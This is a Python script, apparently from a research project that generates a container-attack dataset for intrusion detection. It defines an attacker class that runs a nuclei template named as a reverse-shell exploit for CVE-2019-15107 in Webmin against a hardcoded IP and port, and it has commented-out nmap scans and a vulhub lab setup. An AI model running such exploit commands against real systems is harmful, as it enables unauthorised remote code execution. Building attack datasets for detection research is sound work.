from attackerBase import *
from attackConfig import *



class OSCI_CVE_2019_15107_Attacker3(AttackerBase):
    
    def __init__(self):
        self.commandRunner = CommandRunner()



    def discovery(self) -> None:    
        pass
        #self.commandRunner.runCommand("nmap -n -Pn -p 80,443,10000 192.168.137.192")
        #self.commandRunner.runCommand("nmap -A 144.122.71.18")

    def main(self):
        print("Main method started")
        #self.commandRunner.runCommand('echo "nuclei script started" ')
        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30003 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-15107_Reverse-Shell-Command.yaml -debug ')


    # Reverse shell will be handle later...
    def reverseShell(self):
        pass
        # init newTerminalThread
        # newTerminalThread -> Open terminal and run specific code ( it will wait) 


        # mainThread
        # Run another command1
        # Run another command2
        # Run another command3


    def reverseShell2(self):
        pass


if __name__ == '__main__':
    
    # Call your custom attacks here
    pass




# CWE-78
# CVE-2019-15107
# IP
# PORT
# IMAGE: vulhub/webmin:1.910  https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
# sudo docker run -it -p 10000:10000 -d  vulhub/webmin:1.910

# MAIN YAML PATH: ~/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-15107_Payload.yaml
# MAIN YAML AUTHOR: HALE
# MAIN YAML SOURCE: https://github.com/jas502n/CVE-2019-15107
